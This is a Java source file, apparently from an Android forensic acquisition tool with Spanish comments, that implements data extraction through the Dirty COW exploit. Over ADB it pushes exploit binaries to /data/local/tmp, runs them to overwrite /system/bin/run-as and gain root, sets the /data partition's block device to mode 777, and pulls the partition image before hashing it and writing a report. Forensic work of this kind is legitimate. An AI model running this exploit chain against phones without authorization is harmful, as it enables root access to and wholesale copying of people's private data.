package main.java.model;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import com.android.ddmlib.AdbCommandRejectedException;
import com.android.ddmlib.AndroidDebugBridge;
import com.android.ddmlib.CollectingOutputReceiver;
import com.android.ddmlib.IDevice;
import com.android.ddmlib.ShellCommandUnresponsiveException;
import com.android.ddmlib.SyncException;
import com.android.ddmlib.TimeoutException;

/**
 * Esta clase, es una estrategia de metodo de extracción.
 * En este caso se efectua extracción de datos por Dirty COW.
 * @author Sosa Ludueña Diego
 * @author Choquevilca Gustavo
 * @author Montiel Emiliano
 *
 */
public class ExtraerPorDirtyCow extends ExtractorDatos 
{
	private static int estadoExtraccionDirtyCow;
	private String pathOrigen;
	private String pathDestino;
	private IDevice disp;
	
	public ExtraerPorDirtyCow(Dispositivo dispositivo, UnidadAlmacenamiento unidadAlmacenamiento, boolean isFlagHashMd5, boolean isFlagHashSha256) 
	{
		super(dispositivo, unidadAlmacenamiento, isFlagHashMd5, isFlagHashSha256);
		estadoExtraccionDirtyCow = 0;
		pathOrigen = "";
		pathDestino = "";
	}
	
	/**
     * Este método, realiza extracción de datos utilizando exploit dirty cow.
     * El método cuenta con 7 estados.
     * Estado 0:
     * Chequea que dispositivo Android detectado este conectado a PC y en modo depuración.
     * Estado 1:
     * Chequea que en unidad de almacenamiento seleccionada se encuentre con suficiente memoria.
     * Es decir, debe poseer mayor cantidad de memoria libre que lo que ocupa partición o almacenamiento
     * de dispositivo Android detectado. En caso que no posea suficiente memoria en unidad de almacenamiento
     * se notifica con mensaje de error.
     * Estado 2:
     * Se pasan archivos de explotación necesarios de ordenador a dispositivo Android detectado y luego se
     * ejecutan para explotar vulnerabilidad de dispositivo Android detectado y conseguir escalar privilegios root.
     * Por último, se cambia de permiso partición /data de dispositivo Android detectado para luego extraerla.
     * Estado 3:
     * Se extrae partición /data de dispositivo Android detectado mediante protocolo ADB. Registrando fecha de inicio,
     * fecha de finalización y tiempo de duración de extracción realizada. Y por último, se vuelve por defecto
     * permiso que tenia particion /data.
     * Estado 4:
     * Se realiza el o los hash a partir de extracción de datos efectuada. Dando como resultado uno o dos archivos .md5 y/o .sha256.
     * Estado 5:
     * Se realiza reporte de extracción de datos.
     * Estado -1:
     * Cuando ocurre excepción o espacio de almacenamiento es insuficiente en unidad de almacenamiento.
     * Además, se registra error de excepción en variable mensajeError.
     */
	@SuppressWarnings("deprecation")
	@Override
	public void extraerDatos() 
	{
		try
		{
			switch(estadoExtraccionDirtyCow)
			{
				case 0:
				{
					//SE ENCUENTRA EN MODO ONLINE?
					AndroidDebugBridge adb;
					AndroidDebugBridge.init(false);
					adb = AndroidDebugBridge.createBridge();
					
					Thread.sleep(1000);
					
					if (!adb.isConnected()) 
			        {
			            System.out.println("No se pudo conectar al servidor ADB");
			        }
					else
					{
						if(adb.getDevices().length > 0)
						{
							for(IDevice device : adb.getDevices()) 
							{
								if(dispositivo.getFabricante().equals(Propiedades.getPropiedades("ro.product.manufacturer")) 
								&& dispositivo.getModelo().equals(Propiedades.getPropiedades("ro.product.model"))
								&& dispositivo.getVersionSo().equals(Propiedades.getPropiedades("ro.build.version.release"))
								&& dispositivo.getNumeroCompilacion().equals(Propiedades.getPropiedades("ro.build.display.id")))
								{
									if(device.isRoot() || device.getState().toString().equals("ONLINE"))
									{
										disp = device;
										estadoExtraccionDirtyCow = 1;
									}
									break;
								}
							}
						}
					}
					
					AndroidDebugBridge.disconnectBridge();
					AndroidDebugBridge.terminate();
					break;
				}
				case 1:
				{
					if(unidadAlmacenamiento.chequearTamanioLibre(dispositivo.getTamanioParticion()))
					{
						estadoExtraccionDirtyCow = 2;
					}
					else
					{
						mensajeError = "La unidad de almacenamiento seleccionada no dispone de suficiente espacio de memoria. "
								+ "Se necesitan mas de " 
								+ unidadAlmacenamiento.getTamanioFaltante(dispositivo.getTamanioParticion()) 
								+ " en la unidad de almacenamiento para guardar la extraccion de datos";
						estadoExtraccionDirtyCow = -1; //Por falta de espacio en la unidad de almacenamiento
					}
					break;
				}
				case 2:
				{
					CollectingOutputReceiver outputReceiver = new CollectingOutputReceiver();
					
					disp.pushFile(dispositivo.getRutaDirtyCowDcow(), "/data/local/tmp/dcow");
					disp.executeShellCommand("chmod 777 /data/local/tmp/dcow", outputReceiver);
					disp.pushFile(dispositivo.getRutaDirtyCowRunas(), "/data/local/tmp/run-as");
					disp.executeShellCommand("/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as", outputReceiver, 0);
					
					setCambiarPermisoParticion("777", dispositivo.getRutaParticion());
					
					Thread.sleep(2000);
					disp.executeShellCommand("rm /data/local/tmp/dcow", outputReceiver);
					disp.executeShellCommand("rm /data/local/tmp/run-as", outputReceiver);
					estadoExtraccionDirtyCow = 3;
					break;
				}
				case 3:
				{
					formatoRuta("Extraccion_Fisica");
					unidadAlmacenamiento.crearDirectorioRutaDestino(getFormatoRuta());
					
					pathOrigen = dispositivo.getRutaParticion();
					pathDestino = unidadAlmacenamiento.getRutaDestino() + "/" + getFormatoRuta() + ".img";
					
					setFechaInicioExtraccion();
					disp.pullFile(pathOrigen, pathDestino);
					setCambiarPermisoParticion("600", dispositivo.getRutaParticion());
					setFechaFinalExtraccion();
					setDuracionExtraccion();
					
					estadoExtraccionDirtyCow = 4;
					System.out.println("Se realizo extraccion de datos utilizando metodo dirty COW.");
					break;
				}
				case 4:
				{
					hash = new Hash(unidadAlmacenamiento, isFlagHashMd5, isFlagHashSha256);
					if(hash.generarHash(getFormatoRuta()))
					{
						estadoExtraccionDirtyCow = 5;
					}
					else
					{
						mensajeError = "No se pudo generar hash.";
						estadoExtraccionDirtyCow = -1;
					}
					break;
				}
				case 5:
				{
					nombreMetodoExtraccion = "Metodo Dirty Cow";
					reporte = new Reporte(dispositivo, unidadAlmacenamiento, hash, this);
					if(reporte.generarReporte())
					{
						estadoExtraccionDirtyCow = 6;
					}
					else
					{
						mensajeError = "No se pudo generar reporte.";
						estadoExtraccionDirtyCow = -1;
					}
					break;
				}
			}
		}
		catch (SyncException | IOException | AdbCommandRejectedException | TimeoutException | ShellCommandUnresponsiveException | InterruptedException e) 
		{
			mensajeError = e.getMessage();
			estadoExtraccionDirtyCow = -1;
		}
	}

	/**
     * Este método, cambia de permiso partición de dispositivo Android detectado.
     * Por lo tanto dependiendo de qué permiso y que partición se le envía como parámetro
     * su función será cambiar de permiso partición.
     * Este método, lo utiliza método dirty cow para cambiar inicialmente partición /data con
     * permiso 777. Y luego se lo utiliza de nuevo en dicho método para dejar permiso predeterminado
     * 600 a partición /data.
     * Para realizar esto se crea fichero temporal para realizar redireccionamiento en consola de
     * dispositivo Android detectado.
     * @param permiso Variable String que contiene permiso que normalmente es 777 o 600.
     * @param particion Variable String que contiene partición que depende de dispositivo Android detectado, 
     * Por ejemplo: /dev/block/mmcblk0p24.
     * @throws IOException
     */
	public void setCambiarPermisoParticion(String permiso, String particion) throws IOException
	{
		File ficheroTemporal = File.createTempFile("cambiarPermiso", ".txt");
        	        
		FileWriter flwriter = new FileWriter(ficheroTemporal);
		BufferedWriter bfwriter = new BufferedWriter(flwriter);
		bfwriter.write("/system/bin/run-as\n");
		bfwriter.write("chmod " + permiso + " " + particion + "\n");
		bfwriter.close();
		flwriter.close();
		
		ProcessBuilder builder = new ProcessBuilder("adb","shell");
		builder.redirectInput(ficheroTemporal);
		builder.start();
		ficheroTemporal.deleteOnExit();
	}
	
	/**
     * Esta función, retorna porcentaje de extracción de datos física.
     * Necesita de instancia dispositivo Android detectado para conocer tamaño en bytes
     * de partición. Y teniendo tamaño en bytes parcial de fichero destino
     * se calcula porcentaje. Tamaño Parcial/Tamaño Total x 100.
     * @return porcentajeExtraccionDatos Variable long que contiene porcentaje de extracción
     * de datos.
     */
	@Override
	public long getPorcentajeExtraccionDatos() 
	{
		long porcentajeExtraccionDatos = 0;
		long tamanioOrigen = dispositivo.getTamanioParticion();
		long tamanioDestino = unidadAlmacenamiento.getTamanioLibre();
		
		if(tamanioOrigen == 0)
		{
			porcentajeExtraccionDatos = 100;
		}
		else
		{
			porcentajeExtraccionDatos = (tamanioDestino*100)/tamanioOrigen;
		}
		
		return porcentajeExtraccionDatos;
	}
	
	/**
     * Esta función, retorna tamaño parcial de extracción de datos física convertido en formato
     * legible para humano.
     * Necesita de instancia dispositivo Android detectado para conocer tamaño en bytes
     * de partición. Y teniendo tamaño en bytes parcial de ruta destino de unidad de almacenamiento
     * se concatena ambos tamaños quedando de la siguiente forma. Tamaño Parcial de Tamaño Total.
     * Por ejemplo: 200,15 MB de 5,19 GB.
     * @return tamanioLegibleParcial Variable String que contiene tamaño parcial de extracción de datos
     * convertido en formato legible para humano.
     */
	@Override
	public String getTamanioParcialExtraccionDatos() 
	{
		String tamanioLegibleOrigen = byteCountToDisplaySize(dispositivo.getTamanioParticion()).toString();
		String tamanioLegibleDestino = byteCountToDisplaySize(unidadAlmacenamiento.getTamanioLibre()).toString();
		String tamanioLegibleParcial = tamanioLegibleDestino + " de " + tamanioLegibleOrigen;
				
		return tamanioLegibleParcial;
	}
	
	/**
     * Esta función, retorna estado de extracción de datos.
     * Que permite ser consultada ya sea por modelo o por controladores.
     * @return estadoExtraccionDirtyCow Variable entera.
     */
	public int getEstadoExtraccionDatos()
	{
		return estadoExtraccionDirtyCow;
	}
}
